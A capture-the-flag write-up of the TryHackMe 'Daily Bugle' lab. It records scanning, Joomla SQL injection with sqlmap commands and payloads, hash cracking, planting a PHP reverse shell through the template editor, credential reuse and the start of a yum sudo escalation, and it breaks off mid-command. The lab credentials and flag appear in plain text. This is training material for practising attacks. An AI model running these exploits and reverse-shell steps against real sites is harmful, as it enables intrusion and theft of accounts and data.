---
Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.
---

![](https://i.imgur.com/H98yNCQ.png)

### Deploy 

![](https://i.imgur.com/4xkRRJC.png)

```
┌──(kali㉿kali)-[~/skynet]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.105.102
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 20:50 EDT
Nmap scan report for 10.10.105.102
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB (unauthorized)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/27%OT=22%CT=1%CU=44418%PV=Y%DS=2%DC=T%G=Y%TM=63339A9
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%TS=A)SEQ(SP=101%GC
OS:D=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%II=I%TS=A)
OS:OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505
OS:ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
OS:ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   183.73 ms 10.11.0.1
2   183.95 ms 10.10.105.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.23 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.105.102



```

![](https://www.aldeid.com/w/images/thumb/6/63/CTF-TryHackMe-Daily-Bugle-homepage.png/600px-CTF-TryHackMe-Daily-Bugle-homepage.png)

Access the web server, who robbed the bank?
*spiderman*

### Obtain user and root 

![](https://i.imgur.com/fREnB0x.png)


```
http://10.10.105.102/administrator/manifests/files/joomla.xml

<version>3.7.0</version>

or

http://10.10.105.102/README.txt

1- What is this?
	* This is a Joomla! installation/upgrade package to version 3.x
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 3.7 version history - https://docs.joomla.org/Joomla_3.7_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/master

2- What is Joomla?
	* Joomla! is a Content Management System (CMS) which enables you to build Web sites and powerful online applications.
	* It's a free and Open Source software, distributed under the GNU General Public License version 2 or later.
	* This is a simple and powerful web server application and it requires a server with PHP and either MySQL, PostgreSQL or SQL Server to run.
	You can find full technical requirements here: https://downloads.joomla.org/technical-requirements.

joomscan --url http://10.10.233.69

    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.105.102 ...
                                                                                                                  
                                                                                                                  
                                                                                                                  
[+] FireWall Detector                                                                                             
[++] Firewall not detected                                                                                        
                                                                                                                  
[+] Detecting Joomla Version                                                                                      
[++] Joomla 3.7.0                                                                                                 
                                                                                                                  
[+] Core Joomla Vulnerability                                                                                     
[++] Target Joomla core is not vulnerable                                                                         
                                                                                                                  
[+] Checking Directory Listing                                                                                    
[++] directory has directory listing :                                                                            
http://10.10.105.102/administrator/components                                                                     
http://10.10.105.102/administrator/modules                                                                        
http://10.10.105.102/administrator/templates                                                                      
http://10.10.105.102/images/banners                                                                               
                                                                                                                  
                                                                                                                  
[+] Checking apache info/status files                                                                             
[++] Readable info/status files are not found                                                                     
                                                                                                                  
[+] admin finder                                                                                                  
[++] Admin page : http://10.10.105.102/administrator/                                                             
                                                                                                                  
[+] Checking robots.txt existing                                                                                  
[++] robots.txt is found                                                                                          
path : http://10.10.105.102/robots.txt                                                                            
                                                                                                                  
Interesting path found from robots.txt                                                                            
http://10.10.105.102/joomla/administrator/                                                                        
http://10.10.105.102/administrator/                                                                               
http://10.10.105.102/bin/                                                                                         
http://10.10.105.102/cache/                                                                                       
http://10.10.105.102/cli/                                                                                         
http://10.10.105.102/components/                                                                                  
http://10.10.105.102/includes/                                                                                    
http://10.10.105.102/installation/                                                                                
http://10.10.105.102/language/                                                                                    
http://10.10.105.102/layouts/                                                                                     
http://10.10.105.102/libraries/                                                                                   
http://10.10.105.102/logs/                                                                                        
http://10.10.105.102/modules/                                                                                     
http://10.10.105.102/plugins/                                                                                     
http://10.10.105.102/tmp/                                                                                         
                                                                                                                  
                                                                                                                  
[+] Finding common backup files name                                                                              
[++] Backup files are not found                                                                                   
                                                                                                                  
[+] Finding common log files name                                                                                 
[++] error log is not found                                                                                       
                                                                                                                  
[+] Checking sensitive config.php.x file                                                                          
[++] Readable config files are not found                                                                          
                                                                                                                  
                                                                                                                  
Your Report : reports/10.10.105.102/  



We can confirm that this version of Joomla is vulnerable to CVE-2017-8917 with sqlmap: 

https://www.exploit-db.com/exploits/42033

Using Sqlmap: 

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


┌──(kali㉿kali)-[~/skynet]
└─$ sqlmap -u "http://10.10.105.102/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
        ___
       __H__                                                                                                      
 ___ ___[(]_____ ___ ___  {1.6.9#stable}                                                                          
|_ -| . ["]     | .'| . |                                                                                         
|___|_  ["]_|_|_|__,|  _|                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:18:31 /2022-09-27/

[21:18:31] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                 
[21:18:32] [INFO] testing connection to the target URL
[21:18:33] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=oi0eka2pf4p...55shinn8n3'). Do you want to use those [Y/n] Y
[21:18:49] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:18:50] [INFO] testing if the target URL content is stable
[21:18:50] [INFO] target URL content is stable
[21:18:50] [INFO] heuristic (basic) test shows that GET parameter 'list[fullordering]' might be injectable (possible DBMS: 'MySQL')
[21:18:51] [INFO] testing for SQL injection on GET parameter 'list[fullordering]'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[21:18:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:18:56] [WARNING] reflective value(s) found and filtering out
[21:19:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[21:19:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[21:20:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[21:20:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[21:21:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[21:21:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[21:21:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[21:21:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:21:47] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[21:21:47] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[21:21:48] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[21:21:49] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[21:21:49] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[21:22:11] [INFO] testing 'Generic inline queries'
[21:22:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[21:22:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[21:22:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[21:22:47] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[21:23:08] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[21:23:33] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[21:23:52] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[21:24:16] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[21:24:37] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[21:25:00] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[21:25:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[21:25:21] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[21:25:22] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[21:25:22] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[21:25:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[21:25:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[21:25:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[21:25:25] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[21:25:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[21:25:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[21:25:26] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[21:25:42] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[21:25:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                                                             
[21:25:58] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[21:26:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[21:26:30] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[21:26:47] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[21:27:03] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[21:27:18] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[21:27:34] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[21:27:50] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:28:06] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:28:22] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                                                                
[21:28:37] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[21:28:53] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[21:29:09] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[21:29:25] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:29:41] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[21:29:57] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[21:30:05] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[21:30:16] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[21:30:17] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[21:30:17] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[21:30:17] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[21:30:18] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[21:30:18] [INFO] GET parameter 'list[fullordering]' is 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' injectable 
[21:30:18] [INFO] testing 'MySQL inline queries'
[21:30:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[21:30:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[21:30:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[21:30:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[21:30:19] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[21:30:20] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[21:30:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:30:20] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[21:30:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[21:30:21] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[21:30:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[21:30:21] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[21:30:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[21:30:22] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[21:30:22] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[21:30:22] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[21:30:23] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[21:30:23] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[21:30:23] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[21:30:24] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[21:30:24] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[21:30:24] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[21:30:24] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[21:30:25] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[21:30:25] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[21:30:25] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[21:30:26] [INFO] testing 'MySQL AND time-based blind (ELT)'
[21:30:26] [INFO] testing 'MySQL OR time-based blind (ELT)'
[21:30:26] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[21:30:26] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[21:30:27] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[21:30:27] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                                                                
[21:30:27] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[21:30:28] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[21:30:38] [INFO] GET parameter 'list[fullordering]' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' injectable                                                                                 
[21:30:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:30:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:30:45] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[21:30:51] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[21:30:57] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[21:31:02] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[21:31:08] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[21:31:14] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[21:31:20] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[21:31:25] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[21:31:31] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[21:31:37] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[21:31:43] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[21:31:49] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[21:31:55] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[21:32:01] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[21:32:07] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[21:32:13] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[21:32:18] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[21:32:24] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[21:32:30] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'list[fullordering]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2715 HTTP(s) requests:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 4845 FROM(SELECT COUNT(*),CONCAT(0x716a627171,(SELECT (ELT(4845=4845,1))),0x716a7a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 3021 FROM (SELECT(SLEEP(5)))drfF)
---
[21:34:37] [INFO] the back-end DBMS is MySQL
[21:34:37] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
web server operating system: Linux CentOS 7
web application technology: Apache 2.4.6, PHP 5.6.40
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[21:34:38] [INFO] fetching database names
[21:34:39] [INFO] retrieved: 'information_schema'
[21:34:39] [INFO] retrieved: 'joomla'
[21:34:40] [INFO] retrieved: 'mysql'
[21:34:40] [INFO] retrieved: 'performance_schema'
[21:34:40] [INFO] retrieved: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

[21:34:40] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2675 times
[21:34:40] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.105.102'

[*] ending @ 21:34:40 /2022-09-27/


We can find existing exploits, like this one: 

┌──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ python joomblah.py http://10.10.105.102
                                                                                                                                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session


using john

┌──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > jonah.hash

Now that we have Jonah’s hash, let’s crack it with John: 

after 12 min

┌──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt jonah.hash                         
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)     
1g 0:00:12:04 DONE (2022-09-27 21:51) 0.001379g/s 64.61p/s 64.61c/s 64.61C/s thelma1..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


login
http://10.10.105.102/administrator/index.php

jonah:spiderman123


Go to the administrator directory and login with jonah:spiderman123.

Once logged in, go to Extensions > Templates > Templates and select Protostar:



then index.php add https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

replacing your ip then save


Now browse http://10.10.105.102/index.php

First thing on the server was to list the homes, find users (jjameson is the only user in /home), and try to find user.txt (common name for user flag). No luck.

Then, I inspected the /var/www/html/ directory and extracted the following information from the configuration.php file, which reveals the password for the database. 


┌──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ rlwrap nc -nlvp 4444 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.105.102.
Ncat: Connection from 10.10.105.102:49124.
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 22:14:15 up  1:29,  0 users,  load average: 0.05, 0.10, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache
sh-4.2$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
sh: python3: command not found
sh-4.2$ python -c "import pty;pty.spawn('/bin/bash')"
python -c "import pty;pty.spawn('/bin/bash')"

priv esc

When viewing the contents of the configuration.php file, which normally contains database credentials for Joomla, a password is revealed:

bash-4.2$ cd /var/www/html
cd /var/www/html
bash-4.2$ ls
ls
LICENSE.txt    cli                includes   media       tmp
README.txt     components         index.php  modules     web.config.txt
administrator  configuration.php  language   plugins
bin            htaccess.txt       layouts    robots.txt
cache          images             libraries  templates
bash-4.2$ cat configuration.php
cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';


bash-4.2$ cd /home
cd /home
bash-4.2$ ls
ls
jjameson
bash-4.2$ su jjameson
su jjameson
Password: nv5uz9r3ZEDzVjNu

[jjameson@dailybugle home]$ whoami
whoami
jjameson
[jjameson@dailybugle home]$ sudo -l
sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
[jjameson@dailybugle home]$ ls
ls
jjameson
[jjameson@dailybugle home]$ cd jjameson
cd jjameson
[jjameson@dailybugle ~]$ ls
ls
user.txt
[jjameson@dailybugle ~]$ cat user.txt
cat user.txt
27a260fe3cba712cfdedb1c86d80442e

yum? Let’s check the OS: 

[jjameson@dailybugle ~]$ cat /etc/redhat-release
cat /etc/redhat-release
CentOS Linux release 7.7.1908 (Core)

Interestingly, the server is running on CentOS. Having a look a GTFOBins confirms several privesc with yum. Let’s try. 

https://gtfobins.github.io/gtfobins/yum/


[jjameson@dailybugle ~]$ TF=$(mktemp -d)
TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
